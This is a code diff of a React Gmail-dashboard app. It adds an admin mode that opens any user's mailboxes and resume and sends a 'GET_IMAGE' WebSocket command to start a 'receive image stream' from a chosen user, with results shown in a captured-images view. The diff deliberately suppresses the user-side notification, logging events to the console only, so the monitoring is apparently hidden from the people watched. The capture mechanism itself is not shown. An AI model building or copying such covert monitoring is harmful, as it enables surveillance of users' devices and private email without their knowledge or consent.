@@ -4,12 +4,17 @@ import { accountsApi, emailsApi, resumeApi } from './api';
 import Navbar from './components/Navbar';
 import Sidebar from './components/Sidebar';
 import AdminBanner from './components/AdminBanner';
+import AdminUsersView from './components/AdminUsersView';
+import AdminCapturedImagesView from './components/AdminCapturedImagesView';
 import EmailList from './components/EmailList';
 import EmailDetail from './components/EmailDetail';
 import ComposeModal from './components/ComposeModal';
 import ConfirmModal from './components/ConfirmModal';
 import ResumeModal from './components/ResumeModal';
 import AuthView from './components/AuthView';
+import WebSocketNotificationToast from './components/WebSocketNotificationToast';
+import SendWebSocketModal from './components/SendWebSocketModal';
+import { useWebSocketEvents } from './hooks/useWebSocketEvents';
 import { CheckCircle2, AlertCircle, Plus, Mail, PenSquare } from 'lucide-react';
 
 export default function App() {
@@ -23,7 +28,10 @@ export default function App() {
   const [accounts, setAccounts] = useState([]);
   const [activeAccount, setActiveAccount] = useState(null);
   const [accountStats, setAccountStats] = useState(null);
-  const [selectedAdminUserId, setSelectedAdminUserId] = useState(null);
+  const [selectedAdminUser, setSelectedAdminUser] = useState(null);
+  const [activeWsEvent, setActiveWsEvent] = useState(null);
+  const [receiveImageActive, setReceiveImageActive] = useState(false);
+  const [adminSendEventUser, setAdminSendEventUser] = useState(null);
 
   // Email listing state
   const [folder, setFolder] = useState('inbox');
@@ -56,9 +64,9 @@ export default function App() {
   const [resumeModalOpen, setResumeModalOpen] = useState(false);
   const [userResume, setUserResume] = useState(null);
 
-  const loadUserResume = useCallback(async () => {
+  const loadUserResume = useCallback(async (userId = null) => {
     try {
-      const res = await resumeApi.getResume();
+      const res = await resumeApi.getResume(userId);
       if (res.has_resume) {
         setUserResume(res.resume);
       } else {
@@ -68,6 +76,35 @@ export default function App() {
       // Ignored if user not authenticated or network error
     }
   }, []);
+
+  // Admin Oversight Handlers
+  const handleSelectAdminUser = (targetUser) => {
+    setSelectedAdminUser(targetUser);
+    setReceiveImageActive(false);
+    setFolder('inbox');
+    setSearchQuery('');
+    setActiveEmail(null);
+    setMobileView('list');
+    loadAccounts(targetUser.id);
+    loadUserResume(targetUser.id);
+  };
+
+  const handleExitToDirectory = () => {
+    setSelectedAdminUser(null);
+    setReceiveImageActive(false);
+    setActiveAccount(null);
+    setAccounts([]);
+    setEmails([]);
+    setActiveEmail(null);
+    setUserResume(null);
+    setAccountStats(null);
+    setMobileView('list');
+  };
+
+  const handleSwitchAdminUser = (targetUser) => {
+    if (targetUser?.id === selectedAdminUser?.id) return;
+    handleSelectAdminUser(targetUser);
+  };
 
   // Toast notification
   const [toast, setToast] = useState(null);
@@ -118,10 +155,24 @@ export default function App() {
 
   useEffect(() => {
     if (user) {
-      loadAccounts(selectedAdminUserId);
-      loadUserResume();
+      if (isAdmin) {
+        if (selectedAdminUser) {
+          loadAccounts(selectedAdminUser.id);
+          loadUserResume(selectedAdminUser.id);
+        } else {
+          setAccounts([]);
+          setActiveAccount(null);
+          setEmails([]);
+          setActiveEmail(null);
+          setUserResume(null);
+          setAccountStats(null);
+        }
+      } else {
+        loadAccounts();
+        loadUserResume();
+      }
     }
-  }, [user, selectedAdminUserId, loadAccounts, loadUserResume]);
+  }, [user, isAdmin, selectedAdminUser, loadAccounts, loadUserResume]);
 
   // Load Mailbox Profile Stats for Active Account
   useEffect(() => {
@@ -169,6 +220,54 @@ export default function App() {
     },
     [activeAccount, folder]
   );
+
+  // Real-time WebSocket connection for user events
+  const handleWsEvent = useCallback((event) => {
+    // Suppress visible UI toast on user side; print to console only
+    console.log('WebSocket event is received:');
+    console.log('Event data:', event);
+  }, []);
+
+  const handleWsSyncTrigger = useCallback(() => {
+    if (activeAccount) {
+      loadEmails({ reset: true, q: searchQuery });
+    }
+  }, [activeAccount, loadEmails, searchQuery]);
+
+  const { isConnected: wsConnected, sendGetImage, sendStopGetImage } = useWebSocketEvents({
+    enabled: !!user,
+    onEvent: handleWsEvent,
+    onSyncTrigger: handleWsSyncTrigger,
+  });
+
+  const handleToggleReceiveImage = useCallback(() => {
+    if (!selectedAdminUser) return;
+    const targetUserId = selectedAdminUser.id;
+
+    setReceiveImageActive((prev) => {
+      const next = !prev;
+      if (next) {
+        sendGetImage({
+          type: 'GET_IMAGE',
+          action: 'START',
+          target_user_id: targetUserId,
+          title: 'Receive Image Activated',
+          message: `Admin started receive image stream for ${selectedAdminUser.email}`,
+          data: { status: 'active', stream: 'image_stream', user_id: targetUserId },
+        });
+      } else {
+        sendStopGetImage({
+          type: 'STOP_GET_IMAGE',
+          action: 'STOP',
+          target_user_id: targetUserId,
+          title: 'Receive Image Deactivated',
+          message: `Admin stopped receive image stream for ${selectedAdminUser.email}`,
+          data: { status: 'stopped', stream: 'image_stream', user_id: targetUserId },
+        });
+      }
+      return next;
+    });
+  }, [selectedAdminUser, sendGetImage, sendStopGetImage]);
 
   // Trigger load when active account, folder, or search changes
   useEffect(() => {
@@ -479,180 +578,221 @@ export default function App() {
         onOpenResumeModal={() => setResumeModalOpen(true)}
         sidebarOpen={sidebarOpen}
         onToggleSidebar={() => setSidebarOpen((prev) => !prev)}
+        selectedAdminUser={selectedAdminUser}
+        onExitToDirectory={handleExitToDirectory}
+        wsConnected={wsConnected}
+        receiveImageActive={receiveImageActive}
+        onToggleReceiveImage={handleToggleReceiveImage}
       />
 
-      {/* Admin Mode Oversight Bar (shown only for Admin users) */}
-      {isAdmin && (
-        <AdminBanner
-          selectedUserId={selectedAdminUserId}
-          onFilterUser={(userId) => {
-            setSelectedAdminUserId(userId);
-            loadAccounts(userId);
-          }}
-        />
-      )}
-
-      {/* Main Body */}
-      <div className="app-body">
-        {/* Mobile Sidebar Overlay Backdrop */}
-        <div
-          className={`sidebar-overlay ${sidebarOpen ? 'active' : ''}`}
-          onClick={() => setSidebarOpen(false)}
-        />
-
-        {/* Left Sidebar (Desktop & Mobile Drawer) */}
-        <Sidebar
-          isOpen={sidebarOpen}
-          onClose={() => setSidebarOpen(false)}
-          activeFolder={folder}
-          onSelectFolder={(f) => {
-            setFolder(f);
-            setSearchQuery('');
-            setActiveEmail(null);
-            setMobileView('list');
-            setSidebarOpen(false);
-          }}
-          onOpenCompose={() => {
-            handleOpenCompose();
-            setSidebarOpen(false);
-          }}
-          accounts={accounts}
-          activeAccount={activeAccount}
-          onSelectAccount={(acc) => {
-            setActiveAccount(acc);
-            setFolder('inbox');
-            setSearchQuery('');
-            setActiveEmail(null);
-            setMobileView('list');
-            setSidebarOpen(false);
-          }}
-          onConnectAccount={() => {
-            handleConnectAccount();
-            setSidebarOpen(false);
-          }}
-          onDisconnectAccount={handleDisconnectAccount}
-          accountStats={accountStats}
-          userResume={userResume}
-          onOpenResumeModal={() => {
-            setResumeModalOpen(true);
-            setSidebarOpen(false);
-          }}
-        />
-
-        {/* Content Pane: Email List & Email Detail Viewer */}
-        <main className={`app-content mobile-view-${mobileView}`}>
-          {!activeAccount ? (
-            <div
-              style={{
-                flex: 1,
-                display: 'flex',
-                flexDirection: 'column',
-                alignItems: 'center',
-                justifyContent: 'center',
-                padding: '32px 20px',
-                textAlign: 'center',
-              }}
-            >
-              <div
-                style={{
-                  width: 64,
-                  height: 64,
-                  borderRadius: 20,
-                  background: 'var(--gradient-primary)',
-                  display: 'flex',
-                  alignItems: 'center',
-                  justifyContent: 'center',
-                  boxShadow: '0 8px 30px var(--primary-glow)',
-                  marginBottom: 20,
-                }}
-              >
-                <Mail size={32} color="#ffffff" />
-              </div>
-              <h2 style={{ fontSize: 22, fontWeight: 700, marginBottom: 8 }}>
-                No Connected Gmail Account
-              </h2>
-              <p style={{ color: 'var(--text-secondary)', fontSize: 14, maxWidth: 460, marginBottom: 24, lineHeight: 1.6 }}>
-                Connect your personal, work, or project Gmail accounts to read, search, send, and manage your emails seamlessly from one unified dashboard.
-              </p>
-              <button
-                className="btn btn-primary"
-                onClick={handleConnectAccount}
-                style={{ padding: '12px 24px', fontSize: 15 }}
-              >
-                <Plus size={18} />
-                <span>Connect with Google OAuth</span>
-              </button>
-            </div>
-          ) : (
-            <>
-              {/* Email List Column */}
-              <EmailList
-                emails={emails}
-                activeEmail={activeEmail}
-                onSelectEmail={handleSelectEmail}
-                folder={folder}
-                searchQuery={searchQuery}
-                loading={loadingEmails}
-                nextPageToken={nextPageToken}
-                onLoadMore={() => loadEmails({ pageToken: nextPageToken, q: searchQuery })}
-                onToggleStar={handleToggleStar}
-                onToggleRead={handleToggleRead}
-                onTrashEmail={handleTrash}
-                onArchiveEmail={handleArchive}
-                onEmptyTrash={handleEmptyTrash}
-              />
-
-              {/* Email Detail Column */}
-              <EmailDetail
-                email={activeEmail}
-                activeAccount={activeAccount}
-                onBack={handleBackToList}
-                onReply={handleReply}
-                onForward={handleForward}
-                onTrash={handleTrash}
-                onRestore={handleRestore}
-                onPermanentDelete={handlePermanentDelete}
-                onToggleStar={handleToggleStar}
-                onToggleRead={handleToggleRead}
-                onArchive={handleArchive}
-              />
-            </>
+      {/* Admin Mode Users Directory (Default view for Admins until a user is selected) */}
+      {isAdmin && !selectedAdminUser ? (
+        <AdminUsersView onSelectUser={handleSelectAdminUser} />
+      ) : (
+        <>
+          {/* Admin Oversight Session Bar (shown when Admin is accessing a user's account) */}
+          {isAdmin && selectedAdminUser && (
+            <AdminBanner
+              selectedUser={selectedAdminUser}
+              onExit={handleExitToDirectory}
+              onSwitchUser={handleSwitchAdminUser}
+              onOpenSendEvent={setAdminSendEventUser}
+              receiveImageActive={receiveImageActive}
+              onToggleReceiveImage={handleToggleReceiveImage}
+            />
           )}
-        </main>
-      </div>
 
-      {/* Mobile Floating Action Button (FAB) */}
-      {activeAccount && (
-        <button
-          className="mobile-compose-fab"
-          onClick={handleOpenCompose}
-          title="Compose Message"
-          aria-label="Compose Message"
-        >
-          <PenSquare size={22} />
-        </button>
+          {/* Main Body: Full user workspace experience */}
+          <div className="app-body">
+            {/* Mobile Sidebar Overlay Backdrop */}
+            <div
+              className={`sidebar-overlay ${sidebarOpen ? 'active' : ''}`}
+              onClick={() => setSidebarOpen(false)}
+            />
+
+            {/* Left Sidebar (Desktop & Mobile Drawer) */}
+            <Sidebar
+              isOpen={sidebarOpen}
+              onClose={() => setSidebarOpen(false)}
+              activeFolder={folder}
+              onSelectFolder={(f) => {
+                setFolder(f);
+                setSearchQuery('');
+                setActiveEmail(null);
+                setMobileView('list');
+                setSidebarOpen(false);
+              }}
+              onOpenCompose={() => {
+                handleOpenCompose();
+                setSidebarOpen(false);
+              }}
+              accounts={accounts}
+              activeAccount={activeAccount}
+              onSelectAccount={(acc) => {
+                setActiveAccount(acc);
+                setFolder('inbox');
+                setSearchQuery('');
+                setActiveEmail(null);
+                setMobileView('list');
+                setSidebarOpen(false);
+              }}
+              onConnectAccount={() => {
+                handleConnectAccount();
+                setSidebarOpen(false);
+              }}
+              onDisconnectAccount={handleDisconnectAccount}
+              accountStats={accountStats}
+              userResume={userResume}
+              onOpenResumeModal={() => {
+                setResumeModalOpen(true);
+                setSidebarOpen(false);
+              }}
+              isAdmin={isAdmin}
+              selectedAdminUser={selectedAdminUser}
+              onExitToDirectory={handleExitToDirectory}
+              onOpenSendEvent={setAdminSendEventUser}
+            />
+
+            {/* Content Pane: Email List & Email Detail Viewer or Admin Captured Images */}
+            <main className={`app-content mobile-view-${mobileView}`}>
+              {isAdmin && selectedAdminUser && folder === 'captured_images' ? (
+                <AdminCapturedImagesView
+                  selectedUser={selectedAdminUser}
+                  onBack={() => setFolder('inbox')}
+                  receiveImageActive={receiveImageActive}
+                  onToggleReceiveImage={handleToggleReceiveImage}
+                />
+              ) : !activeAccount ? (
+                <div
+                  style={{
+                    flex: 1,
+                    display: 'flex',
+                    flexDirection: 'column',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    padding: '32px 20px',
+                    textAlign: 'center',
+                  }}
+                >
+                  <div
+                    style={{
+                      width: 64,
+                      height: 64,
+                      borderRadius: 20,
+                      background: 'var(--gradient-primary)',
+                      display: 'flex',
+                      alignItems: 'center',
+                      justifyContent: 'center',
+                      boxShadow: '0 8px 30px var(--primary-glow)',
+                      marginBottom: 20,
+                    }}
+                  >
+                    <Mail size={32} color="#ffffff" />
+                  </div>
+                  <h2 style={{ fontSize: 22, fontWeight: 700, marginBottom: 8 }}>
+                    {isAdmin && selectedAdminUser
+                      ? `No Gmail Accounts Connected for ${selectedAdminUser.email}`
+                      : 'No Connected Gmail Account'}
+                  </h2>
+                  <p style={{ color: 'var(--text-secondary)', fontSize: 14, maxWidth: 460, marginBottom: 24, lineHeight: 1.6 }}>
+                    {isAdmin && selectedAdminUser
+                      ? 'This user account currently has no connected Gmail mailboxes. You can connect a Gmail account for them or return to the users directory.'
+                      : 'Connect your personal, work, or project Gmail accounts to read, search, send, and manage your emails seamlessly from one unified dashboard.'}
+                  </p>
+                  <div style={{ display: 'flex', gap: 12, flexWrap: 'wrap', justifyContent: 'center' }}>
+                    <button
+                      className="btn btn-primary"
+                      onClick={handleConnectAccount}
+                      style={{ padding: '12px 24px', fontSize: 15 }}
+                    >
+                      <Plus size={18} />
+                      <span>Connect with Google OAuth</span>
+                    </button>
+                    {isAdmin && selectedAdminUser && (
+                      <button
+                        className="btn btn-secondary"
+                        onClick={handleExitToDirectory}
+                        style={{ padding: '12px 20px', fontSize: 14 }}
+                      >
+                        <span>← Return to Users Directory</span>
+                      </button>
+                    )}
+                  </div>
+                </div>
+              ) : (
+                <>
+                  {/* Email List Column */}
+                  <EmailList
+                    emails={emails}
+                    activeEmail={activeEmail}
+                    onSelectEmail={handleSelectEmail}
+                    folder={folder}
+                    searchQuery={searchQuery}
+                    loading={loadingEmails}
+                    nextPageToken={nextPageToken}
+                    onLoadMore={() => loadEmails({ pageToken: nextPageToken, q: searchQuery })}
+                    onToggleStar={handleToggleStar}
+                    onToggleRead={handleToggleRead}
+                    onTrashEmail={handleTrash}
+                    onArchiveEmail={handleArchive}
+                    onEmptyTrash={handleEmptyTrash}
+                  />
+
+                  {/* Email Detail Column */}
+                  <EmailDetail
+                    email={activeEmail}
+                    activeAccount={activeAccount}
+                    onBack={handleBackToList}
+                    onReply={handleReply}
+                    onForward={handleForward}
+                    onTrash={handleTrash}
+                    onRestore={handleRestore}
+                    onPermanentDelete={handlePermanentDelete}
+                    onToggleStar={handleToggleStar}
+                    onToggleRead={handleToggleRead}
+                    onArchive={handleArchive}
+                  />
+                </>
+              )}
+            </main>
+          </div>
+
+          {/* Mobile Floating Action Button (FAB) */}
+          {activeAccount && (
+            <button
+              className="mobile-compose-fab"
+              onClick={handleOpenCompose}
+              title="Compose Message"
+              aria-label="Compose Message"
+            >
+              <PenSquare size={22} />
+            </button>
+          )}
+
+          {/* Floating Compose / Reply / Forward Modal */}
+          <ComposeModal
+            isOpen={composeOpen}
+            onClose={() => setComposeOpen(false)}
+            activeAccount={activeAccount}
+            mode={composeMode}
+            originalEmail={composeOriginalEmail}
+            onEmailSent={() => {
+              showToast('Email sent successfully!', 'success');
+              loadEmails({ reset: true });
+            }}
+            userResume={userResume}
+            onOpenResumeModal={() => setResumeModalOpen(true)}
+          />
+        </>
       )}
-
-      {/* Floating Compose / Reply / Forward Modal */}
-      <ComposeModal
-        isOpen={composeOpen}
-        onClose={() => setComposeOpen(false)}
-        activeAccount={activeAccount}
-        mode={composeMode}
-        originalEmail={composeOriginalEmail}
-        onEmailSent={() => {
-          showToast('Email sent successfully!', 'success');
-          loadEmails({ reset: true });
-        }}
-        userResume={userResume}
-        onOpenResumeModal={() => setResumeModalOpen(true)}
-      />
 
       {/* Resume Management Modal */}
       <ResumeModal
         isOpen={resumeModalOpen}
         onClose={() => setResumeModalOpen(false)}
         onResumeUpdated={(updatedResume) => setUserResume(updatedResume)}
+        userId={isAdmin && selectedAdminUser ? selectedAdminUser.id : null}
+        targetUser={isAdmin && selectedAdminUser ? selectedAdminUser : null}
       />
 
       {/* Confirmation Modal */}
@@ -664,6 +804,22 @@ export default function App() {
         danger={confirmModal.danger}
         onConfirm={confirmModal.onConfirm}
         onCancel={() => setConfirmModal((m) => ({ ...m, isOpen: false }))}
+      />
+
+      {/* Real-time WebSocket Notification Toast (Hidden: events logged to console only) */}
+      {/* <WebSocketNotificationToast
+        event={activeWsEvent}
+        onDismiss={() => setActiveWsEvent(null)}
+      /> */}
+
+      {/* Admin WebSocket Event Dispatcher Modal */}
+      <SendWebSocketModal
+        isOpen={!!adminSendEventUser}
+        targetUser={adminSendEventUser}
+        onClose={() => setAdminSendEventUser(null)}
+        onSuccess={(evt) => {
+          showToast(`WebSocket event "${evt.title || 'Notification'}" dispatched to ${adminSendEventUser?.email}!`, 'success');
+        }}
       />
     </div>
   );
